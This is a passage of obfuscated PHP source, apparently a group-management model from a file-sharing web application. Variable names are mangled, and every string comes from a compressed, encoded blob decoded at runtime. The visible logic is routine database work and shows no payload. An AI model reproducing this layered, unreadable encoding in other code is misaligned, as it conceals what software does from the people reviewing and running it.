$Û”ÎÉà›; foreach ($Û”ÎÉà› as $Ş´ßÕÀ«) { $ì¶œÂğ = $this->getInfoSimple($Ş´ßÕÀ«); $Êì¼àÕî = array($àÈÍ³…Ş[553] => array($àÈÍ³…Ş[427], $ì¶œÂğ[$àÈÍ³…Ş[553]] . $Ş´ßÕÀ« . $àÈÍ³…Ş[581])); $§¥ìÏú = $this->field($àÈÍ³…Ş[1887])->where($Êì¼àÕî)->select(); $˜‹²’„¿ = array_merge($˜‹²’„¿, array_to_keyvalue($§¥ìÏú, $àÈÍ³…Ş[12], $àÈÍ³…Ş[1887])); } return array_unique($˜‹²’„¿); } private function _searchFromMeta($Í¬»Ùõ–, $ğˆŒ³¾Ü, $ƒú£¬Õğ, $ô÷ûšœï) { $è´†İÓˆ =& $_SERVER[—ÌÒğš÷]; $ğˆŒ³¾Ü = strtolower($ğˆŒ³¾Ü); $å¨…âµİ = array($è´†İÓˆ[94] => $Í¬»Ùõ–, $è´†İÓˆ[418] => array($è´†İÓˆ[427], "\45{$ğˆŒ³¾Ü}\45")); $å¨…âµİ = $this->parseWhereLike($å¨…âµİ); if ($ô÷ûšœï) { $å¨…âµİ[$è´†İÓˆ[1887]] = array($è´†İÓˆ[7], $ô÷ûšœï); } $¯ÔªËã = Model($è´†İÓˆ[1986])->where($å¨…âµİ)->limit($ƒú£¬Õğ)->select(); if (!$¯ÔªËã) { return array(); } $¯ÔªËã = array_to_keyvalue($¯ÔªËã, $è´†İÓˆ[12], $è´†İÓˆ[1887]); $½æ‹ÊìÁ = $this->where(array($è´†İÓˆ[1975] => array($è´†İÓˆ[7], $¯ÔªËã)))->select(); if (!$½æ‹ÊìÁ) { return array(); } return $½æ‹ÊìÁ; } protected function _listDataApplyItem($×à‰èú) { $ãêÇïç’ = array($×à‰èú); $this->_listDataApply($ãêÇïç’); return $ãêÇïç’[0]; } protected function _listDataApply(&$ñÎ–Œç) { $…ÍËÕ´ù =& $_SERVER[—ÌÒğš÷]; if (!$ñÎ–Œç) { return; } $äÑÑ‹Ôš = array_to_keyvalue($ñÎ–Œç, $…ÍËÕ´ù[12], $…ÍËÕ´ù[1887]); $this->_listAppendChildren($ñÎ–Œç); $this->_listAppendChildrenMember($ñÎ–Œç); $this->_listAppendMeta($ñÎ–Œç, $äÑÑ‹Ôš); $this->_listAppendParent($ñÎ–Œç); $this->_listAppendSourceRoot($ñÎ–Œç, $äÑÑ‹Ôš); } private function _listAppendChildren(&$ÌÆÒ§±) { $²å•ñß‡ =& $_SERVER[—ÌÒğš÷]; $—¨¹Áøˆ = array_to_keyvalue($ÌÆÒ§±, $²å•ñß‡[12], $²å•ñß‡[1887]); $¾Æ¤÷Ñ« = array($²å•ñß‡[180] => array($²å•ñß‡[7], $—¨¹Áøˆ)); $Ûó˜İ  = array($²å•ñß‡[180], $²å•ñß‡[1987] => $²å•ñß‡[533]); $Œ›şŸ¢ = $this->field($Ûó˜İ )->where($¾Æ¤÷Ñ«)->group($²å•ñß‡[180])->select(); $•˜ß‡´™ = array_to_keyvalue($Œ›şŸ¢, $²å•ñß‡[180], $²å•ñß‡[533]); foreach ($ÌÆÒ§± as &$”—Ë¿¶ò) { $‹‹ˆÓøé = $”—Ë¿¶ò[$²å•ñß‡[1887]]; $”—Ë¿¶ò[$²å•ñß‡[1988]] = isset($•˜ß‡´™[$‹‹ˆÓøé]) ? intval($•˜ß‡´™[$‹‹ˆÓøé]) : !1; } unset($”—Ë¿¶ò); } private function _listAppendChildrenMember(&$ú¬ş‘ì™) { $°Ú¦ÎÔœ =& $_SERVER[—ÌÒğš÷]; $—›öÂºı = array_to_keyvalue($ú¬ş‘ì™, $°Ú¦ÎÔœ[12], $°Ú¦ÎÔœ[1887]); $öĞÉ¨ = array($°Ú¦ÎÔœ[1887] => array($°Ú¦ÎÔœ[7], $—›öÂºı)); $Ó»ê³œŸ = array($°Ú¦ÎÔœ[1887], $°Ú¦ÎÔœ[1987] => $°Ú¦ÎÔœ[533]); $ŠóŸß‡À = Model($°Ú¦ÎÔœ[1977])->field($Ó»ê³œŸ)->where($öĞÉ¨)->group($°Ú¦ÎÔœ[1887])->select(); $êšÃ³¡¿ = array_to_keyvalue($ŠóŸß‡À, $°Ú¦ÎÔœ[1887], $°Ú¦ÎÔœ[533]); foreach ($ú¬ş‘ì™ as &$û˜·‹ñ™) { $¢Ë´¢¸¢ = $û˜·‹ñ™[$°Ú¦ÎÔœ[1887]]; $û˜·‹ñ™[$°Ú¦ÎÔœ[1989]] = isset($êšÃ³¡¿[$¢Ë´¢¸¢]) ? intval($êšÃ³¡¿[$¢Ë´¢¸¢]) : !1; } unset($û˜·‹ñ™); } private function _listAppendMeta(&$ïò´©ä», $°²í¤öœ) { $şÈ¡†´ =& $_SERVER[—ÌÒğš÷]; $óÑÇ­¥À = array($şÈ¡†´[1887] => array($şÈ¡†´[7], $°²í¤öœ)); $ä£¤ÜÇ = Model($şÈ¡†´[1976])->where($óÑÇ­¥À)->select(); $ä£¤ÜÇ = array_to_keyvalue_group($ä£¤ÜÇ, $şÈ¡†´[1887]); foreach ($ä£¤ÜÇ as &$ŠÉØ…µ–) { $ŠÉØ…µ– = array_to_keyvalue($ŠÉØ…µ–, $şÈ¡†´[94], $şÈ¡†´[418]); } unset($ŠÉØ…µ–); foreach ($ïò´©ä» as &$Ö¢äıÆ–) { $Ö¢äıÆ–[$şÈ¡†´[507]] = array(); if (isset($ä£¤ÜÇ[$Ö¢äıÆ–[$şÈ¡†´[1887]]])) { $Ö¢äıÆ–[$şÈ¡†´[507]] = $ä£¤ÜÇ[$Ö¢äıÆ–[$şÈ¡†´[1887]]]; } } unset($Ö¢äıÆ–); } protected function parentLevelArray($™§çÛ‚½) { $şçáã¢Ô =& $_SERVER[—ÌÒğš÷]; $™§çÛ‚½ = explode($şçáã¢Ô[50], trim($™§çÛ‚½, $şçáã¢Ô[50])); $™§çÛ‚½ = array_remove_value($™§çÛ‚½, $şçáã¢Ô[212]); return $™§çÛ‚½; } protected function parentInGroup($ú•ØØ§Ê, $ÆÍÈ·´Å) { $ç–÷Öšö =& $_SERVER[—ÌÒğš÷]; $Áïã‹™Ê = $this->getInfoSimple($ú•ØØ§Ê); if (!$Áïã‹™Ê) { return !0; } $Û×Å·Ôı = $this->parentLevelArray($Áïã‹™Ê[$ç–÷Öšö[553]]); $Û×Å·Ôı[] = $ú•ØØ§Ê; foreach ($Û×Å·Ôı as $ú•ØØ§Ê) { if (in_array($ú•ØØ§Ê . $ç–÷Öšö[12], $ÆÍÈ·´Å)) { return !0; } } return !1; } private function _listAppendParent(&$öä‹Òâ…) { $Á­§†ÅÚ =& $_SERVER[—ÌÒğš÷]; $¦ë®½Å = array(); foreach ($öä‹Òâ… as &$ğüÍù†ã) { $¦ë®½Å[$ğüÍù†ã[$Á­§†ÅÚ[1887]]] = $ğüÍù†ã[$Á­§†ÅÚ[32]]; $ìÙ‰¾Ï = $this->parentLevelArray($ğüÍù†ã[$Á­§†ÅÚ[553]]); foreach ($ìÙ‰¾Ï as $ª¹ò„Õö) { if (!isset($¦ë®½Å[$ª¹ò„Õö])) { $¦ë®½Å[$ª¹ò„Õö] = 0; } } } unset($ğüÍù†ã); foreach ($¦ë®½Å as $ıçó©÷š => $‹Ë½Ÿ”í) { if ($‹Ë½Ÿ”í) { continue; } $“¯ßÒê = $this->getInfoSimple($ıçó©÷š); $¦ë®½Å[$ıçó©÷š] = $“¯ßÒê[$Á­§†ÅÚ[32]]; } $Œäß”ÓÜ = $GLOBALS[$Á­§†ÅÚ[6]][$Á­§†ÅÚ[89]][$Á­§†ÅÚ[1990]]; if ($GLOBALS[$Á­§†ÅÚ[536]] == $Á­§†ÅÚ[88]) { $Œäß”ÓÜ = !1; } foreach ($öä‹Òâ… as &$ğüÍù†ã) { $ìÙ‰¾Ï = $this->parentLevelArray($ğüÍù†ã[$Á­§†ÅÚ[553]]); $±®÷Ïí = $Á­§†ÅÚ[12]; foreach ($ìÙ‰¾Ï as $ıçó©÷š => $ª¹ò„Õö) { if ($Œäß”ÓÜ && $ıçó©÷š == 0) { continue; } $±®÷Ïí .= $¦ë®½Å[$ª¹ò„Õö] . $Á­§†ÅÚ[8]; } if ($ìÙ‰¾Ï) { $±®÷Ïí .= $ğüÍù†ã[$Á­§†ÅÚ[32]]; } $ğüÍù†ã[$Á­§†ÅÚ[558]] = str_replace($Á­§†ÅÚ[561], $Á­§†ÅÚ[8], $±®÷Ïí); } unset($ğüÍù†ã); } private function _listAppendSourceRoot(&$ü†•ÃÕ, $°³œÖ¯“) { $ç”‰‚‚¬ =& $_SERVER[—ÌÒğš÷]; $ù´¤İ£Æ = Model($ç”‰‚‚¬[861])->listSourceRoot(SourceModel::TYPE_GROUP, $°³œÖ¯“); $ù´¤İ£Æ = array_to_keyvalue($ù´¤İ£Æ, $ç”‰‚‚¬[538]); $ù´¤İ£Æ = array_remove_key($ù´¤İ£Æ, $ç”‰‚‚¬[538]); foreach ($ü†•ÃÕ as &$öîˆá‰) { $öîˆá‰[$ç”‰‚‚¬[87]] = $ù´¤İ£Æ[$öîˆá‰[$ç”‰‚‚¬[1887]]] ? $ù´¤İ£Æ[$öîˆá‰[$ç”‰‚‚¬[1887]]] : array(); } unset($öîˆá‰); } protected function groupMerge($ƒªÚù„ï) { $ƒªÚù„ï = array_values(array_unique($ƒªÚù„ï)); $‡×’€õ = array(); for ($õş†¬§ = 0; $õş†¬§ < count($ƒªÚù„ï); $õş†¬§++) { $ğüæ¢®„ = !1; for ($Àâõ…úÇ = 0; $Àâõ…úÇ < count($ƒªÚù„ï); $Àâõ…úÇ++) { if ($õş†¬§ == $Àâõ…úÇ) { continue; } if ($this->isParentOf($ƒªÚù„ï[$Àâõ…úÇ], $ƒªÚù„ï[$õş†¬§])) { $ğüæ¢®„ = !0; break; } } if (!$ğüæ¢®„) { $‡×’€õ[] = $ƒªÚù„ï[$õş†¬§]; } } return $‡×’€õ; } protected function isParentOf($·“±É–™, $ê°ú˜…) { $ê½ÂÑ‹Í =& $_SERVER[—ÌÒğš÷]; if (!$·“±É–™ || !$ê°ú˜… || $·“±É–™ == $ê°ú˜…) { return !1; } $Ø·èòœÔ = $this->getInfoSimple($·“±É–™); $øæ äå„ = $this->getInfoSimple($ê°ú˜…); $’–Ìµñ = $Ø·èòœÔ[$ê½ÂÑ‹Í[553]] . $·“±É–™ . $ê½ÂÑ‹Í[50]; if (substr($øæ äå„[$ê½ÂÑ‹Í[553]], 0, strlen($’–Ìµñ)) == $’–Ìµñ) { return !0; } return !1; } public function groupShowRoot($´Ÿªİá, $¾÷é™Õ‘ = false) { $şˆ¥è« =& $_SERVER[—ÌÒğš÷]; $ş€³ØÎÊ = $this->getInfo($´Ÿªİá); if (!$ş€³ØÎÊ) { return array(); } $ğ¬‰Ú’ = $this->parentLevelArray($ş€³ØÎÊ[$şˆ¥è«[553]]); $ô±»Ø = array($´Ÿªİá); if (count($ğ¬‰Ú’) == 0) { return $ô±»Ø; } if ($¾÷é™Õ‘ && count($ğ¬‰Ú’) == 1) { return $ô±»Ø; } if (!$ş€³ØÎÊ[$şˆ¥è«[507]] || !isset($ş€³ØÎÊ[$şˆ¥è«[507]][$şˆ¥è«[1973]]) || $ş€³ØÎÊ[$şˆ¥è«[507]][$şˆ¥è«[1973]] == $şˆ¥è«[1942]) { return $this->groupShowRoot($ğ¬‰Ú’[count($ğ¬‰Ú’) - 1], $¾÷é™Õ‘); } if ($ş€³ØÎÊ[$şˆ¥è«[507]][$şˆ¥è«[1973]] == $şˆ¥è«[401]) { $î¿³—ã = explode($şˆ¥è«[50], $ş€³ØÎÊ[$şˆ¥è«[507]][$şˆ¥è«[1974]]); if ($î¿³—ã) { $ô±»Ø = array_merge($ô±»Ø, $î¿³—ã); } } return $ô±»Ø; } protected function resetParentLevel() { $Ú¤ßØÖ =& $_SERVER[—ÌÒğš÷]; $ÖïŸÔ›Ñ = $Ú¤ßØÖ[1887]; $Á‘»çò = $this->select(); $Á‘»çò = array_to_keyvalue($Á‘»çò, $ÖïŸÔ›Ñ); foreach ($Á‘»çò as $ıÕ˜ê¯–) { $ƒ»»²Œª = $ıÕ˜ê¯–; $‡ö¨¤©ã = array(); while ($ƒ»»²Œª[$Ú¤ßØÖ[180]] != 0) { $‡ö¨¤©ã[] = $ƒ»»²Œª[$Ú¤ßØÖ[180]]; $ƒ»»²Œª = $Á‘»çò[$ƒ»»²Œª[$Ú¤ßØÖ[180]]]; } $‡ö¨¤©ã[] = 0; $‡ö¨¤©ã = $Ú¤ßØÖ[50] . implode($Ú¤ßØÖ[50], array_reverse($‡ö¨¤©ã)) . $Ú¤ßØÖ[50]; $this->setNamePinyin($ıÕ˜ê¯–[$ÖïŸÔ›Ñ], $ıÕ˜ê¯–[$Ú¤ßØÖ[32]]); $this->where(array($ÖïŸÔ›Ñ => $ıÕ˜ê¯–[$ÖïŸÔ›Ñ]))->save(array($Ú¤ßØÖ[620] => $‡ö¨¤©ã)); } return $Á‘»çò; } public function groupNameAuto($€Øº°²Ú, $ŞšÙÓö‡) { $”ˆï³ =& $_SERVER[—ÌÒğš÷]; $ÒÀéìÙİ = $this->where(array($”ˆï³[445] => $€Øº°²Ú))->getField($”ˆï³[32], !0); if (!$ÒÀéìÙİ || !in_array($ŞšÙÓö‡, $ÒÀéìÙİ)) { return $ŞšÙÓö‡; } for ($­ŠÎşƒë = 1; $­ŠÎşƒë <= count($ÒÀéìÙİ) + 1; $­ŠÎşƒë++) { $¾…çñïÚ = $ŞšÙÓö‡ . "\x28{$­ŠÎşƒë}\x29"; if (!in_array($¾…çñïÚ, $ÒÀéìÙİ)) { return $¾…çñïÚ; } } } public function groupSwitch($Üõ¼Ëˆ, $ŞïÃı½) { $ò¤ì¾Ä =& $_SERVER[—ÌÒğš÷]; $§İä›¼½ = array($ò¤ì¾Ä[1887] => array($ò¤ì¾Ä[7], array($Üõ¼Ëˆ, $ŞïÃı½))); $ªÏü††ò = $this->where($§İä›¼½)->select(); $ªÏü††ò = array_to_keyvalue($ªÏü††ò, $ò¤ì¾Ä[1887]); if (!isset($ªÏü††ò[$Üõ¼Ëˆ]) || !isset($ªÏü††ò[$ŞïÃı½]) || $ªÏü††ò[$Üõ¼Ëˆ][$ò¤ì¾Ä[180]] == 0) { return !1; } $§İä›¼½ = array($ò¤ì¾Ä[1887] => $Üõ¼Ëˆ); $Ä£‰Ú¥ó = Model($ò¤ì¾Ä[1977])->where($§İä›¼½)->select(); if (!$Ä£‰Ú¥ó) { $Ä£‰Ú¥ó = array(); } foreach ($Ä£‰Ú¥ó as $æÔöÏ«) { $¿¡—©ªĞ = $æÔöÏ«[$ò¤ì¾Ä[1688]]; $§İä›¼½ = array($ò¤ì¾Ä[1688] => $¿¡—©ªĞ, $ò¤ì¾Ä[1887] => $ŞïÃı½); $ Ëàø»º = Model($ò¤ì¾Ä[1977])->where($§İä›¼½)->find(); if (!$ Ëàø»º) { $‚¾Ã¯¬ = array($ŞïÃı½ => $æÔöÏ«[$ò¤ì¾Ä[1991]]); Model($ò¤ì¾Ä[567])->userGroupAdd($¿¡—©ªĞ, $‚¾Ã¯¬); } Model($ò¤ì¾Ä[567])->userGroupRemove($¿¡—©ªĞ, $Üõ¼Ëˆ); } $§İä›¼½ = array($ò¤ì¾Ä[178] => 2, $ò¤ì¾Ä[180] => 0, $ò¤ì¾Ä[453] => 1, $ò¤ì¾Ä[538] => array($ò¤ì¾Ä[7], array($Üõ¼Ëˆ, $ŞïÃı½))); $Ûˆ¾Êœõ = Model($ò¤ì¾Ä[861])->where($§İä›¼½)->field($ò¤ì¾Ä[1992])->select(); $Ûˆ¾Êœõ = array_to_keyvalue($Ûˆ¾Êœõ, $ò¤ì¾Ä[538], $ò¤ì¾Ä[181]); $¶á¿Ï¾ñ = !empty($Ûˆ¾Êœõ[$Üõ¼Ëˆ]) ? $Ûˆ¾Êœõ[$Üõ¼Ëˆ] : !1; if ($¶á¿Ï¾ñ) { if (!$Ûˆ¾Êœõ[$ŞïÃı½]) { $Ûˆ¾Êœõ[$ŞïÃı½] = Model($ò¤ì¾Ä[861])->groupRootAdd($ŞïÃı½); } $Â¹õ¦Ğ– = $Ûˆ¾Êœõ[$ŞïÃı½]; $§İä›¼½ = array($ò¤ì¾Ä[180] => $¶á¿Ï¾ñ); $Ûˆ¾Êœõ = Model($ò¤ì¾Ä[861])->where($§İä›¼½)->field($ò¤ì¾Ä[1993])->select(); if (!$Ûˆ¾Êœõ) { $Ûˆ¾Êœõ = array(); } Model($ò¤ì¾Ä[861])->moveClearAuth = !1; foreach ($Ûˆ¾Êœõ as $šÉƒËë) { $íÉ­´›µ = $šÉƒËë[$ò¤ì¾Ä[453]] == $ò¤ì¾Ä[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ò¤ì¾Ä[861])->move($šÉƒËë[$ò¤ì¾Ä[181]], $Â¹õ¦Ğ–, $íÉ­´›µ); } Model($ò¤ì¾Ä[861])->moveClearAuth = !0; $§İä›¼½ = array($ò¤ì¾Ä[178] => 2, $ò¤ì¾Ä[538] => $Üõ¼Ëˆ); $ÇÍ‰¹Ã´ = array($ò¤ì¾Ä[538] => $ŞïÃı½); Model($ò¤ì¾Ä[1994])->where($§İä›¼½)->save($ÇÍ‰¹Ã´); Model($ò¤ì¾Ä[1995])->where($§İä›¼½)->save($ÇÍ‰¹Ã´); } $this->_changeChildLevel($ªÏü††ò[$Üõ¼Ëˆ], $ªÏü††ò[$ŞïÃı½], !0); $this->where(array($ò¤ì¾Ä[180] => $Üõ¼Ëˆ))->save(array($ò¤ì¾Ä[180] => $ŞïÃı½)); $this->_clearChildrenCache($ªÏü††ò[$ŞïÃı½]); return !0; } } goto eˆ¨ääŒ; e‘Ë½†¢: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('l8zS8Jr3'), "\311\322\214\336\272\366"); $_SERVER[—ÌÒğš÷] = explode(strrev('|||'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\174\133\325\365\60\120\366\50\263\137\51\264\360\60\11\266\23\15\333\131\340\304\111\144\131\266\225\310\226\221\344\54\333\171\171\222"."\236\254\27\113\172\212\336\223\107\6\205\102\330\201\262\302\10\205\322\301\50\220\60\3\24\102\200\122\50\5\302\52\273\214\102\22\106\231\205\102\133\112\373\335\161\356\170\117\62"."\xfc\xbf\xdf\xf7\xfd\x7e\x5f\x7e\x49\x74\xef\xb9\xe3\xdd\x71\xee\xb9\xe7\x9e\x7b\xce\xb9\x37\x9f\xff\xca\xe6\x17\xef\x5c\xfd\x9d\xd5\xbb\xaf\xde\xf3\xf3\xed\xb7\xdc\xf1\xd8\x59\x34\xbc\x7a\xd7\xd5"."\xbb\xad\xde\x83\x86\x8f\x3e\x67\xef\x5d\xc8\x9f\x43\xcf\x39\xbb\xae\xae\x73\xfa\xbe\x93\xbb\xf7\x3f\xff\x8e\x9b\xb5\x9b\xb4\xdf\x68\xeb\xa2\x91\xc7\x9f\x8\x1f\xb0\xed\xa6\x79\xa1\x9d\xbf\x7c\x7c"."\x6c\xe7\xae\xbb\xfc\x29\xfb\xa0\xd5\x8c\x32\xd3\xb2\xcd\xf4\x47\x29\x98\xb6\xa2\x8f\x1a\x96\x6d\x51\x40\xca\x2c\x64\x8c\x41\x1a\x36\xa\xf4\xd7\x4f\x7f\x7a\x63\x91\x92\x9e\x37\x6d\x9d\x46\x7d\xf4".base64_decode('R4V2kf+tFTmDpavd0YQa7+3pCcUSkKlZTs+baQgVtZKWh+8X9ZKFWiNXpxbNol5wQA==')."\4\40\255\331\132\122\263\240\246\266\126\265\55\324\23\211\56\126\23\213\173\102\220\43\251\256\50\353\245\61\32\43\301\270\255\225\354\204\221\327\171\216\221\22\157\127\153\250\43".strrev('”Ñ–S¬ÆBWN_j'."\n".'º:‰éL¯ÎÒ$h±á*\''."\n".'êí8)»G˜ xîb$­Ü')."\x65\x4a\x3d\xd\xb4\x1b\x7a\x2e\x4d\x83\x5\x8d\x35\xc7\x1e\x2b\x42\x28\xc1\x43\x68\x9a\xa\xe5\x5c\x8e\x46\xba\x79\x28\xad\x67\xb4\x72\xe\x46\xab\x4d\x8e\x14\x4b\x46\x5e\x63\x9d\x9e\xaf\x8f\x71"."\x28\xd\x68\x65\xdb\x34\xa\x29\x1a\x9\x8d\xda\x25\x4d\xc0\x51\x5b\x53\x68\xa2\xf5\x2\x54\x15\xf\x45\x42\xc1\x84\x82\x1b\xa8\xb4\xc7\xa2\x5d\xa\x4c\x42\x5e\xb3\x6c\xbd\xa4\x2c\xec\xc\xc5\x42"."\xa\x6e\x74\x4b\x2d\xe9\x6b\xad\x2\xf8\xd2\x8d\x86\x42\x9\x44\x22\xca\x78\x35\xd8\x7a\xbe\xc8\xaa\xa1\x65\xaa\x54\x16\x8d\xb5\x85\x62\x4a\xeb\x62\x45\x8c\x50\xca\xcc\xe7\xcd\x82\xf\xd5\x82\x66".base64_decode('0paaGorFaMAD6B0J40mDSLS9PR7iMejciRHUkimAn45YOpOz1WEtV2ZoOkR/a+EHfg==')."\x4d\xb\x50\x77\x85\x51\x30\xca\x80\xa6\x50\x85\x69\xf2\x65\x5\x81\x32\xcb\xad\x33\x88\x9e\x86\x40\x1e\x95\x37\x61\xe5\xa1\x65\x38\x4c\x83\x2d\xb3\xe9\xef\x4c\xc8\x94\x54\x71\x9a\x5e\xb2\x55\xbd"."\220\62\323\106\1\26\353\34\100\72\315\316\266\225\14\224\201\306\63\146\56\315\302\226\261\22\272\222\61\162\172\167\71\57\147\341\321\124\326\310\245\113\154\175\175\123\116\32\215".strrev(']â^¸éjg1ofØÁÎ£mºÀ¼h>´aéJ\\³-SÃ×ÎÖ&3#t¯„µXŠóŠåğ')."\x33\xcc\x76\x54\x51\xb4\x6c\xcb\xc0\x32\xc9\xd6\x6e\x96\xf2\x6d\x88\x32\xc0\xf7\xd1\xaa\x30\x7a\xab\x24\xc\xb1\x75\x91\x96\x46\xcc\x5f\xd7\x77\x8a\xf7\x3f\x3\x7d\x73\xd1\x7f\xf5\x40\xfa\xfa\xa1"."\115\131\75\227\123\365\121\35\26\116\76\75\315\142\203\341\267\222\106\301\217\40\64\32\216\252\131\315\312\166\245\247\251\244\24\243\250\151\175\324\127\314\26\141\125\363\205\334\357".base64_decode('QGw8dN2mHZLocs5MaTm5izScte1iXC+k8UhAV8yRAhmpoq5DpjaPkla6lMVKZ7PRbA==')."\xb1\x82\xf9\x1c\xf\xb1\xde\x71\x98\xc5\x81\xf6\x28\x9b\xce\x74\x86\x6\x92\x6c\x5b\xa8\x81\xf\x1a\x16\xa1\x70\x62\x79\x6a\xc5\x62\xce\x48\x69\xb6\x61\x16\xfc\x66\xca\xd6\x6d\xaf\x65\x97\x74\xd".base64_decode('agykUrpleYNmwS6ZOW8glzNHvNGSMWgUmpVJQGxRIlrUXkwAm2Gl1sxUMOLgz0xqKQ==')."\333\31\357\361\154\5\362\334\45\255\140\145\364\222\67\4\53\243\131\101\215\345\124\220\145\153\63\254\242\151\31\270\171\315\212\146\333\132\52\213\51\210\250\276\345\33\362\33\205".strrev('—ÉG¨áIY¦†š0*Ô¬rÅ+5¯0m%=½×j‚T®•[X·IF‹F†ò+ĞQœ').base64_decode('Ldtb0hEpMtB2B4Mczni78Loy9LQ3jig2gKc0TFUQ6igsjUI7E4keNdyOtuTukNoVSA==')."\x4\x3b\xa1\xd9\xb6\x36\xc8\xda\x1c\x41\x74\x98\x57\xc9\x80\x8b\xbc\x68\x7d\x61\xe4\xea\x46\x7d\x15\xc0\x1e\x73\x44\x2f\xa1\xf\xb7\x8e\x35\x2b\x43\x66\x3a\x69\x8e\xfa\x58\x12\xce\x1c\x47\x84\x86"."\x65\xc6\xd3\x5d\xb4\xbd\x31\xad\x30\x88\xc7\x27\x39\x66\xeb\x96\x9b\x54\xb5\xa2\xd\xdc\x97\xa1\x8b\xd9\x97\xd4\x33\x66\x9\x7a\x63\xd\xf\x3a\xe7\x22\xa2\x17\x6\xed\x2c\xab\x3b\x1e\x8a\x2d\x8"."\305\324\170\264\75\261\60\20\203\375\276\200\20\151\224\265\6\177\75\347\215\351\151\64\73\51\233\225\323\212\170\140\131\36\274\176\360\307\131\52\136\123\54\55\22\356\300\143\327"."\346\265\120\46\257\234\213\325\35\61\362\6\356\236\315\123\310\140\43\146\240\3\32\344\47\175\156\351\267\46\325\365\247\47\327\173\321\377\223\352\373\372\333\174\223\6\346\370\15".base64_decode('Ucbf6GtUmhqmKz2IOzG0nAKdrsjRoETnO4dFIHzBLOjfMDh4e5Mog2tYKTAWOrE3FA==')."\117\250\135\241\104\147\264\15\276\36\12\100\50\142\322\225\315\172\333\107\177\6\0\1\6\350\217\152\130\355\322\316\203\243\234\102\251\146\162\71\232\214\56\235\221\141\230\371\160".strrev('E'."\0".'h6Š3£…²z˜rÒYœÌ¥ÕÀÌ`ÆêvŠûæ‘¡l°ÈìNàM¹Õö”^').base64_decode('K+bKCGf8+AuJbDmfBKKPmMRB3RY8mDWGGJU829zQDmmH2xxbGMT8Kp7nfl+xMFg/AQ==')."\352\122\233\246\65\140\0\240\50\164\21\61\243\145\275\162\14\174\51\23\55\212\56\155\110\157\306\235\2\22\63\223\100\131\104\242\75\63\361\166\321\342\136\123\170\236\162\276\74".strrev('O~‡ìÔ –où5œ,>Zàï›r Şx9ì…a ät³%KÑBíÎ™ıÙGù4Ô„ª')."\x6c\x6a\x67\xfb\xa1\x3f\x3e\x5\xfd\x15\x9b\x5f\xda\xcc\x6b\x6c\x2b\x21\x9b\x80\x9e\xa6\xbb\x0\x5\x4d\x72\xa4\x74\xea\x9a\x60\x63\xec\x92\x6d\x62\x68\xc9\x91\x5\xe1\x53\xd6\x4\xbc\x46\xf3\x6"."\x4d\x2a\xf3\xb6\xb1\x56\xa6\xf5\x9c\xce\x70\x21\xab\xb3\x8d\xb4\x1\xb2\xa1\xb1\xe3\x98\x92\xe1\x28\x8b\xf8\x61\x4\x15\x1c\x8c\x61\xc5\x50\x49\xbc\xed\xb1\xf8\x42\x7c\x80\x10\x0\xbc\xf7\xc3\xcc"."\213\140\16\215\173\224\340\276\210\367\224\364\214\1\344\252\200\120\263\113\53\15\261\216\241\222\142\325\340\210\264\242\332\173\43\21\65\30\355\116\240\363\7\205\54\214\205\23\41"."\266\202\3\155\152\40\330\103\143\234\47\41\64\270\162\203\245\220\341\46\230\144\324\10\277\340\4\320\246\126\64\13\226\356\115\101\11\161\72\251\110\112\213\215\22\350\254\330\134".base64_decode('XfvlqFfLr/TmEQnw8uY52RQFNlDK7YRhmsT+hwcPrULGH/VE41BgDoYiHjXJF0tPLw==')."\44\345\45\24\351\10\1\160\137\300\252\254\6\234\147\140\141\234\355\135\145\224\277\144\254\324\104\227\346\260\366\260\216\344\163\202\345\165\366\312\53\146\36\125\71\325\333\331\25"."\10\172\343\235\201\246\151\323\51\164\161\76\335\237\350\64\254\376\45\74\16\343\66\142\115\125\113\72\42\17\254\346\246\206\106\266\170\21\243\41\265\147\261\67\357\305\265\340\41".base64_decode('8zU0NLC6Jk9XsogqAfqahTSZFhisZDk1xFaIlmI8Hz4UW94RgxHUCZw9nlCJLhOcWw==')."\7\124\121\46\274\235\252\245\360\307\124\124\243\135\266\344\241\101\353\50\215\12\31\214\225\245\120\55\67\210\106\331\316\346\145\240\230\151\32\327\51\207\305\47\213\217\42\36\333"."\152\273\31\133\367\210\271\32\143\133\166\265\66\54\252\326\206\105\256\66\54\252\154\3\5\131\306\140\1\365\222\355\111\211\316\160\367\174\265\53\332\26\212\250\341\156\264\5\47"."\52\341\275\75\155\1\266\122\145\170\153\64\321\351\200\366\242\115\170\101\40\22\166\147\17\55\12\307\23\361\252\111\10\326\33\162\245\264\265\252\75\261\120\173\170\21\217\266\207"."\103\221\266\270\32\14\4\73\105\236\356\100\127\210\357\274\172\56\155\371\235\371\125\304\115\304\271\160\103\35\306\202\32\206\205\252\103\236\240\262\223\262\52\210\5\142\54\165\30"."\x70\xe8\x2e\x16\xf\x91\x9e\xa8\xc\x49\xcb\x8c\xd7\xe1\x87\xaa\x3c\xdb\xd\xf2\x1a\xd0\x48\x8d\x71\x84\x75\xf4\xa7\x5e\x9\xc4\x15\xbb\xa8\x72\xba\x9f\x1c\xe3\x41\xd2\xd\x16\x47\x5b\x19\x7c\x5f"."\1\316\246\242\5\52\316\323\52\261\237\325\1\201\214\315\371\32\127\34\121\71\221\206\146\40\100\344\120\10\23\310\214\300\147\14\104\63\113\166\200\65\47\43\144\100\152\264\47".base64_decode('FAtgCZK6MBbt7oACI1mdNSAMw1/HDhogSLLF1oNOCRqTKIhBX26yoVxNf44DUoCOpA==')."\100\131\12\154\324\223\170\27\146\134\24\13\144\20\331\143\73\250\131\346\137\113\232\146\216\21\144\304\10\363\235\201\13\242\226\133\14\111\106\331\236\62\231\223\62\100\335\350\374".strrev('ºäÈÿi¼ø'."\r".'˜±`2o¿.›&9ÈÎ(XÄĞO“æØ€Á,P€¤l$Æ‹0Ê·P').strrev('b'."\0".'ï÷ƒewš•Şûšsuıûû÷7Ôæ³¨>|ix—+Œ¢9÷ë£KšOÔ'."\n".''."\0".'ßdï>')."\xfb\xea\x27\x3\x60\x60\x55\x93\x67\xea\x1a\x9c\x1\x65\x9c\x73\xec\x0\xfa\x69\xe9\x9f\x33\xb1\xdf\x7b\xdc\x49\xcb\xe6\xf6\xf5\xf\xd4\x3